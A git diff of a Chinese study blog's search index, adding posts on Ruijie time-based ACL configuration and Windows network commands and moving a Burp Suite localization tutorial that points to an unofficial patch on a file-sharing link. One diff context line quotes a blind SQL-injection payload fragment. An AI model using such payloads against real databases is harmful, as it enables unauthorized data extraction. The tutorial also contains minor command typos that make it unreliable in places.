+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151442.png" alt="13" loading="lazy"></p>
+<h3 id="配置基于时间的ACL"><a href="#配置基于时间的ACL" class="headerlink" title="配置基于时间的ACL"></a>配置基于时间的ACL</h3><ul>
+<li>配置方法 <ul>
+<li>正确配置设备时间</li>
+<li>在#模式下使用clock set命令设置 </li>
+<li>定义时间段：为ACL中的特定ACE关联定义好的时间段 </li>
+<li>绝对时间段： absolute，定义一个绝对的时间段 </li>
+<li>周期时间段： periodic，定义一个循环往复的时间段</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#time-range WORK_TIME
+Ruijie(config-time-range)#absolute ?
+end Ending time and date
+start Starting time and date
+Ruijie(config-time-range)#absolute start 9:00 28 July 2021 end 
+12:00 28 July 2021</code></pre>
+
+
+
+<pre class="language-none"><code class="language-none">Ruijie(config)#time-range WORK_TIME
+Ruijie(config-time-range)#periodic ?
+Daily Every day of the week
+Friday Friday
+Monday Monday
+Saturday Saturday
+Sunday Sunday
+Thursday Thursday
+Tuesday Tuesday
+Wednesday Wednesday
+Weekdays Monday through Friday
+Weekend Saturday and Sunday
+Ruijie(config-time-range)#periodic weekdays 9:00 to 18:00</code></pre>
+
+
+
+<ul>
+<li>配置方法<ul>
+<li>正确配置设备时间 </li>
+<li>在#模式下使用clock set命令设置 </li>
+<li>定义时间段：为ACL中的特定ACE关联定义好的时间段 </li>
+<li>当不在WORK_TIME定义的时间范围内，则所配置的两条ACE语句不生效</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">ip access-list extended OA
+10 permit tcp any host 192.168.1.100 eq www time-range WORK_TIME 
+20 deny tcp any host 192.168.1.100 eq www
+30 permit ip any any</code></pre>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kali-Linux设置为中文</title>
     <url>/posts/5e07eda7/</url>
     <content><![CDATA[<ol>
@@ -1930,7 +2390,9 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
 
 
 
+<br>
 
+<br>
 
 <p>OSPF协议，全称开放最短路径优先协议（ Open Shortest Path First ），它是IETF组织开发的一个基于 链路状态的内部网关路由协议（IGP）。因其的开放性以及丰富的功能特性，成为目前业内使用最广泛的 路由协议之一</p>
 <h2 id="OSPF的基本概念"><a href="#OSPF的基本概念" class="headerlink" title="OSPF的基本概念"></a>OSPF的基本概念</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
@@ -3545,68 +4007,6 @@ Ruijie#terminal monitor </code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Suite汉化教程</title>
-    <url>/posts/d334592a/</url>
-    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载所需安装包</p>
-<p>Burp Suite官网：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a></p>
-<p>java环境（推荐下载11.0.1）：<a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p>
-<p>汉化补丁（百度网盘含Java环境）：<a href="https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo">https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo</a> 	</p>
-<p>提取码：2yfo</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105115.png" alt="0.5" loading="lazy"></p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
-<li>.双击下载的文件，选择安装路径（例如我的安装位置是：D:\jdk）</li>
-</ol>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105117.png" alt="1.1" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105119.png" alt="1" loading="lazy"></p>
-<ol start="2">
-<li>配置环境变量（设置–系统–关于–高级系统设置–环境变量）</li>
-</ol>
-<p>在系统环境变量中添加新的环境变量	<code>JAVA_HOME</code>		<code>D:\jdk</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105120.png" alt="2" loading="lazy"></p>
-<p>在系统环境变量中<code>Path</code>中添加:<code>%JAVA_HOME%\bin</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105122.png" alt="3" loading="lazy"></p>
-<ol start="3">
-<li><p>验证是否安装成功</p>
-<pre class="language-none"><code class="language-none">jave -version</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105123.png" alt="4" loading="lazy"></p>
-</li>
-<li><p>burp安装</p>
-</li>
-</ol>
-<p>双击下载的exe可执行文件，选择安装路径。（D:\BurpSuiteCommunity）</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105125.png" alt="5.5" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105126.png" alt="5" loading="lazy"></p>
-<ol start="5">
-<li>汉化</li>
-</ol>
-<p>把下载的汉化工具移动到burp安装的路径下。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105128.png" alt="6" loading="lazy"></p>
-<p>双击汉化工具，勾选<code>cn</code>后点击<code>run</code>即可</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105129.png" alt="7" loading="lazy"></p>
-<p>成功（虽然不是所有汉化，也够用了）</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602185201.png" alt="8" loading="lazy"></p>
-<ol start="6">
-<li>添加快捷方式（每次进目录点汉化工具太麻烦了）</li>
-</ol>
-<p>右键汉化工具-发送到-桌面桌面快捷方式</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105131.png" alt="9" loading="lazy"></p>
-<p>发送到桌面的快捷方式看起来很不合适，可以对该快捷方式右键属性更改图标</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105132.png" alt="10" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105134.png" alt="11" loading="lazy"></p>
-<p>搞定</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105136.png" alt="12" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>工具汉化</category>
-      </categories>
-      <tags>
-        <tag>汉化</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typora基本用法</title>
     <url>/posts/1bd41834/</url>
     <content><![CDATA[<p>[toc]</p>
@@ -3920,6 +4320,68 @@ cond(no)-&gt;op</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Suite汉化教程</title>
+    <url>/posts/d334592a/</url>
+    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载所需安装包</p>
+<p>Burp Suite官网：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a></p>
+<p>java环境（推荐下载11.0.1）：<a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p>
+<p>汉化补丁（百度网盘含Java环境）：<a href="https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo">https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo</a> 	</p>
+<p>提取码：2yfo</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105115.png" alt="0.5" loading="lazy"></p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li>.双击下载的文件，选择安装路径（例如我的安装位置是：D:\jdk）</li>
+</ol>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105117.png" alt="1.1" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105119.png" alt="1" loading="lazy"></p>
+<ol start="2">
+<li>配置环境变量（设置–系统–关于–高级系统设置–环境变量）</li>
+</ol>
+<p>在系统环境变量中添加新的环境变量	<code>JAVA_HOME</code>		<code>D:\jdk</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105120.png" alt="2" loading="lazy"></p>
+<p>在系统环境变量中<code>Path</code>中添加:<code>%JAVA_HOME%\bin</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105122.png" alt="3" loading="lazy"></p>
+<ol start="3">
+<li><p>验证是否安装成功</p>
+<pre class="language-none"><code class="language-none">jave -version</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105123.png" alt="4" loading="lazy"></p>
+</li>
+<li><p>burp安装</p>
+</li>
+</ol>
+<p>双击下载的exe可执行文件，选择安装路径。（D:\BurpSuiteCommunity）</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105125.png" alt="5.5" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105126.png" alt="5" loading="lazy"></p>
+<ol start="5">
+<li>汉化</li>
+</ol>
+<p>把下载的汉化工具移动到burp安装的路径下。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105128.png" alt="6" loading="lazy"></p>
+<p>双击汉化工具，勾选<code>cn</code>后点击<code>run</code>即可</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105129.png" alt="7" loading="lazy"></p>
+<p>成功（虽然不是所有汉化，也够用了）</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602185201.png" alt="8" loading="lazy"></p>
+<ol start="6">
+<li>添加快捷方式（每次进目录点汉化工具太麻烦了）</li>
+</ol>
+<p>右键汉化工具-发送到-桌面桌面快捷方式</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105131.png" alt="9" loading="lazy"></p>
+<p>发送到桌面的快捷方式看起来很不合适，可以对该快捷方式右键属性更改图标</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105132.png" alt="10" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105134.png" alt="11" loading="lazy"></p>
+<p>搞定</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105136.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>工具汉化</category>
+      </categories>
+      <tags>
+        <tag>汉化</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VLAN原理及VLAN间通信</title>
     <url>/posts/ad13b3a0/</url>
     <content><![CDATA[<div class="danger">
@@ -4114,6 +4576,211 @@ VLAN Name 		Status 		Ports
 </li>
 </ul>
 <p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145118.png" alt="13" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows常用网络命令</title>
+    <url>/posts/13c75e65/</url>
+    <content><![CDATA[<div class="danger">
+
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="Ping命令应用解析"><a href="#Ping命令应用解析" class="headerlink" title="Ping命令应用解析"></a>Ping命令应用解析</h2><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><ul>
+<li>ICMP协议全称Internet控制报文协议（Internet Control Message Protocol），是网络层的一个重要协 议</li>
+<li>ICMP协议用来在网络设备间传递各种差错和控制信息</li>
+<li>对于收集各种网络信息、诊断和排除各种网络故障具有至关重要的作用</li>
+<li>ICMP协议有两个重要应用，在Windows系统与RGOS中经常会使用到</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155123.png" alt="1" loading="lazy"></p>
+<h3 id="ICMP信息反馈"><a href="#ICMP信息反馈" class="headerlink" title="ICMP信息反馈"></a>ICMP信息反馈</h3><ul>
+<li>根据ICMP的反馈信息，可以分析出到达目的地址连通性的信息 </li>
+<li>根据这些信息反馈，可以初步分析网络故障的原因</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>反馈信息</th>
+<th>信息解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>！</td>
+<td>收到1个ICMP的request replay</td>
+</tr>
+<tr>
+<td>U</td>
+<td>收到1个ICMP不可达信息</td>
+</tr>
+<tr>
+<td>.</td>
+<td>表示在规定的时间内没有收到对应的request replay</td>
+</tr>
+<tr>
+<td>Request Timed Out</td>
+<td>超时，目标主机不存在 或ICMP应答功能关闭，不予应答</td>
+</tr>
+<tr>
+<td>Destination Host Unreachable</td>
+<td>网络设备没有到目标主机的路由</td>
+</tr>
+<tr>
+<td>Unknown host</td>
+<td>未知主机 ，有可能是DNS的问题</td>
+</tr>
+</tbody></table>
+<h3 id="Ping命令应用解析-1"><a href="#Ping命令应用解析-1" class="headerlink" title="Ping命令应用解析"></a>Ping命令应用解析</h3><ul>
+<li>Ping命令应用解析<ul>
+<li>作用：基于ICMP协议，测试网络联通性</li>
+<li>默认情况下，ping操作会收到4个ICMP回包，包大小为32字节，TTL等于64。</li>
+<li>操作演示</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155128.png" alt="2" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（-t）<ul>
+<li>作用：长ping数据包不中断 </li>
+<li>说明：键入Ctrl+C可中断ICMP回包 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155135.png" alt="3" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（-n）<ul>
+<li>作用：指定单次ping包的发送数量 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155145.png" alt="4" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（-l）<ul>
+<li>作用：修改Ping包大小，默认为32字节。可用于测试接口MTU值设置是否合理等场景</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155149.png" alt="5" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（参数组合）<ul>
+<li>作用： ping命令后加相应参数，可自定义连通性测试的效果</li>
+</ul>
+</li>
+</ul>
+<p>略</p>
+<ul>
+<li>Ping命令扩展（ping域名）<ul>
+<li>作用：测试与特定网络资源的连通性时，若不知其具体IP地址，可直接ping其域名，此时DNS可自动解析为 对应IP地址</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155154.png" alt="6" loading="lazy"></p>
+<h2 id="Tracert命令应用解析"><a href="#Tracert命令应用解析" class="headerlink" title="Tracert命令应用解析"></a>Tracert命令应用解析</h2><h3 id="Tracert命令应用解析-1"><a href="#Tracert命令应用解析-1" class="headerlink" title="Tracert命令应用解析"></a>Tracert命令应用解析</h3><ul>
+<li><p>Tracert命令</p>
+<ul>
+<li>作用：基于ICMP协议，在探测网络连通性的同时，探测到目标主机所经过的路径，显示沿路径设备的接口IP </li>
+<li>原理：<ul>
+<li>源主机首先发三个包，TTL&#x3D;1 </li>
+<li>第一台路由器收到后，TTL-1&#x3D;0，丢弃并回复源主机ICMP报超时消息 </li>
+<li>收到超时消息，源主机显示信息并发送下一组三个包，TTL&#x3D;上一组TTL+1 </li>
+<li>收到目标主机的应答后程序终止</li>
+<li>*号表示探测包丢失</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155203.png" alt="7" loading="lazy"></p>
+<ul>
+<li><p>Tracert命令</p>
+<ul>
+<li>说明：运营商核心骨干网及大型IDC数据中心为了安全起见一般会通过相关技术做到核心路径隐藏，此时 tracert并非实际路径跟踪</li>
+<li>操作演示</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155211.png" alt="9" loading="lazy"></p>
+<ul>
+<li>Tracert命令（域名跟踪） </li>
+<li>作用：不得知目标具体IP地址的情况下，可tracert其域名，此时DNS将会解析出其IP地址。 </li>
+<li>操作演示</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155207.png" alt="8" loading="lazy"></p>
+<h2 id="Ipconfig命令应用解析"><a href="#Ipconfig命令应用解析" class="headerlink" title="Ipconfig命令应用解析"></a>Ipconfig命令应用解析</h2><h3 id="IPconfig命令应用解析"><a href="#IPconfig命令应用解析" class="headerlink" title="IPconfig命令应用解析"></a>IPconfig命令应用解析</h3><ul>
+<li>ipconfig命令<ul>
+<li>作用：显示所有适配器（网卡）的基本IP配置 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155220.png" alt="10" loading="lazy"></p>
+<ul>
+<li>Ipconfig &#x2F;all命令 <ul>
+<li>作用：显示所有适配器（网卡）详细完整的IP配置</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155224.png" alt="11" loading="lazy"></p>
+<h2 id="其他Windows命令解析"><a href="#其他Windows命令解析" class="headerlink" title="其他Windows命令解析"></a>其他Windows命令解析</h2><h3 id="清除DNS缓存命令解析"><a href="#清除DNS缓存命令解析" class="headerlink" title="清除DNS缓存命令解析"></a>清除DNS缓存命令解析</h3><ul>
+<li>pconfig &#x2F;flushdns命令<ul>
+<li>作用：查看Windows系统arp表项。</li>
+<li>说明：可使用ipconfig &#x2F;flushdns清除DNS缓存表</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155229.png" alt="12" loading="lazy"></p>
+<h3 id="arp-a命令应用解析"><a href="#arp-a命令应用解析" class="headerlink" title="arp -a命令应用解析"></a>arp -a命令应用解析</h3><ul>
+<li>arp –a 命令 <ul>
+<li>作用：查看Windows系统arp表项。</li>
+<li>说明：可使用arp –d命令清除arp缓存表 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155234.png" alt="13" loading="lazy"></p>
+<h3 id="Route-print命令应用解析"><a href="#Route-print命令应用解析" class="headerlink" title="Route print命令应用解析"></a>Route print命令应用解析</h3><ul>
+<li>Route print 命令<ul>
+<li>作用：查看Windows系统路由表</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155238.png" alt="14" loading="lazy"></p>
+<h3 id="添加静态路由"><a href="#添加静态路由" class="headerlink" title="添加静态路由"></a>添加静态路由</h3><ul>
+<li><p>route –p add 【目标IP地址&#x2F;网段】 mask 【子网掩码】【下一跳】</p>
+<ul>
+<li>作用：Windows添加静态路由 </li>
+<li>操作演示</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155243.png" alt="15" loading="lazy"></p>
+<ul>
+<li>route print查看</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155246.png" alt="16" loading="lazy"></p>
+<ul>
+<li>Route delete删除</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155252.png" alt="17" loading="lazy"></p>
+<ul>
+<li>说明：增添&#x2F;删除静态路由操作需要在Windows超级管理员权限下进行</li>
+</ul>
+</li>
+</ul>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -4337,211 +5004,6 @@ http server enable
       </tags>
   </entry>
   <entry>
-    <title>Windows常用网络命令</title>
-    <url>/posts/13c75e65/</url>
-    <content><![CDATA[<div class="danger">
-
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="Ping命令应用解析"><a href="#Ping命令应用解析" class="headerlink" title="Ping命令应用解析"></a>Ping命令应用解析</h2><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><ul>
-<li>ICMP协议全称Internet控制报文协议（Internet Control Message Protocol），是网络层的一个重要协 议</li>
-<li>ICMP协议用来在网络设备间传递各种差错和控制信息</li>
-<li>对于收集各种网络信息、诊断和排除各种网络故障具有至关重要的作用</li>
-<li>ICMP协议有两个重要应用，在Windows系统与RGOS中经常会使用到</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155123.png" alt="1" loading="lazy"></p>
-<h3 id="ICMP信息反馈"><a href="#ICMP信息反馈" class="headerlink" title="ICMP信息反馈"></a>ICMP信息反馈</h3><ul>
-<li>根据ICMP的反馈信息，可以分析出到达目的地址连通性的信息 </li>
-<li>根据这些信息反馈，可以初步分析网络故障的原因</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>反馈信息</th>
-<th>信息解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>！</td>
-<td>收到1个ICMP的request replay</td>
-</tr>
-<tr>
-<td>U</td>
-<td>收到1个ICMP不可达信息</td>
-</tr>
-<tr>
-<td>.</td>
-<td>表示在规定的时间内没有收到对应的request replay</td>
-</tr>
-<tr>
-<td>Request Timed Out</td>
-<td>超时，目标主机不存在 或ICMP应答功能关闭，不予应答</td>
-</tr>
-<tr>
-<td>Destination Host Unreachable</td>
-<td>网络设备没有到目标主机的路由</td>
-</tr>
-<tr>
-<td>Unknown host</td>
-<td>未知主机 ，有可能是DNS的问题</td>
-</tr>
-</tbody></table>
-<h3 id="Ping命令应用解析-1"><a href="#Ping命令应用解析-1" class="headerlink" title="Ping命令应用解析"></a>Ping命令应用解析</h3><ul>
-<li>Ping命令应用解析<ul>
-<li>作用：基于ICMP协议，测试网络联通性</li>
-<li>默认情况下，ping操作会收到4个ICMP回包，包大小为32字节，TTL等于64。</li>
-<li>操作演示</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155128.png" alt="2" loading="lazy"></p>
-<ul>
-<li>Ping命令扩展（-t）<ul>
-<li>作用：长ping数据包不中断 </li>
-<li>说明：键入Ctrl+C可中断ICMP回包 </li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155135.png" alt="3" loading="lazy"></p>
-<ul>
-<li>Ping命令扩展（-n）<ul>
-<li>作用：指定单次ping包的发送数量 </li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155145.png" alt="4" loading="lazy"></p>
-<ul>
-<li>Ping命令扩展（-l）<ul>
-<li>作用：修改Ping包大小，默认为32字节。可用于测试接口MTU值设置是否合理等场景</li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155149.png" alt="5" loading="lazy"></p>
-<ul>
-<li>Ping命令扩展（参数组合）<ul>
-<li>作用： ping命令后加相应参数，可自定义连通性测试的效果</li>
-</ul>
-</li>
-</ul>
-<p>略</p>
-<ul>
-<li>Ping命令扩展（ping域名）<ul>
-<li>作用：测试与特定网络资源的连通性时，若不知其具体IP地址，可直接ping其域名，此时DNS可自动解析为 对应IP地址</li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155154.png" alt="6" loading="lazy"></p>
-<h2 id="Tracert命令应用解析"><a href="#Tracert命令应用解析" class="headerlink" title="Tracert命令应用解析"></a>Tracert命令应用解析</h2><h3 id="Tracert命令应用解析-1"><a href="#Tracert命令应用解析-1" class="headerlink" title="Tracert命令应用解析"></a>Tracert命令应用解析</h3><ul>
-<li><p>Tracert命令</p>
-<ul>
-<li>作用：基于ICMP协议，在探测网络连通性的同时，探测到目标主机所经过的路径，显示沿路径设备的接口IP </li>
-<li>原理：<ul>
-<li>源主机首先发三个包，TTL&#x3D;1 </li>
-<li>第一台路由器收到后，TTL-1&#x3D;0，丢弃并回复源主机ICMP报超时消息 </li>
-<li>收到超时消息，源主机显示信息并发送下一组三个包，TTL&#x3D;上一组TTL+1 </li>
-<li>收到目标主机的应答后程序终止</li>
-<li>*号表示探测包丢失</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155203.png" alt="7" loading="lazy"></p>
-<ul>
-<li><p>Tracert命令</p>
-<ul>
-<li>说明：运营商核心骨干网及大型IDC数据中心为了安全起见一般会通过相关技术做到核心路径隐藏，此时 tracert并非实际路径跟踪</li>
-<li>操作演示</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155211.png" alt="9" loading="lazy"></p>
-<ul>
-<li>Tracert命令（域名跟踪） </li>
-<li>作用：不得知目标具体IP地址的情况下，可tracert其域名，此时DNS将会解析出其IP地址。 </li>
-<li>操作演示</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155207.png" alt="8" loading="lazy"></p>
-<h2 id="Ipconfig命令应用解析"><a href="#Ipconfig命令应用解析" class="headerlink" title="Ipconfig命令应用解析"></a>Ipconfig命令应用解析</h2><h3 id="IPconfig命令应用解析"><a href="#IPconfig命令应用解析" class="headerlink" title="IPconfig命令应用解析"></a>IPconfig命令应用解析</h3><ul>
-<li>ipconfig命令<ul>
-<li>作用：显示所有适配器（网卡）的基本IP配置 </li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155220.png" alt="10" loading="lazy"></p>
-<ul>
-<li>Ipconfig &#x2F;all命令 <ul>
-<li>作用：显示所有适配器（网卡）详细完整的IP配置</li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155224.png" alt="11" loading="lazy"></p>
-<h2 id="其他Windows命令解析"><a href="#其他Windows命令解析" class="headerlink" title="其他Windows命令解析"></a>其他Windows命令解析</h2><h3 id="清除DNS缓存命令解析"><a href="#清除DNS缓存命令解析" class="headerlink" title="清除DNS缓存命令解析"></a>清除DNS缓存命令解析</h3><ul>
-<li>pconfig &#x2F;flushdns命令<ul>
-<li>作用：查看Windows系统arp表项。</li>
-<li>说明：可使用ipconfig &#x2F;flushdns清除DNS缓存表</li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155229.png" alt="12" loading="lazy"></p>
-<h3 id="arp-a命令应用解析"><a href="#arp-a命令应用解析" class="headerlink" title="arp -a命令应用解析"></a>arp -a命令应用解析</h3><ul>
-<li>arp –a 命令 <ul>
-<li>作用：查看Windows系统arp表项。</li>
-<li>说明：可使用arp –d命令清除arp缓存表 </li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155234.png" alt="13" loading="lazy"></p>
-<h3 id="Route-print命令应用解析"><a href="#Route-print命令应用解析" class="headerlink" title="Route print命令应用解析"></a>Route print命令应用解析</h3><ul>
-<li>Route print 命令<ul>
-<li>作用：查看Windows系统路由表</li>
-<li>操作演示：</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155238.png" alt="14" loading="lazy"></p>
-<h3 id="添加静态路由"><a href="#添加静态路由" class="headerlink" title="添加静态路由"></a>添加静态路由</h3><ul>
-<li><p>route –p add 【目标IP地址&#x2F;网段】 mask 【子网掩码】【下一跳】</p>
-<ul>
-<li>作用：Windows添加静态路由 </li>
-<li>操作演示</li>
-</ul>
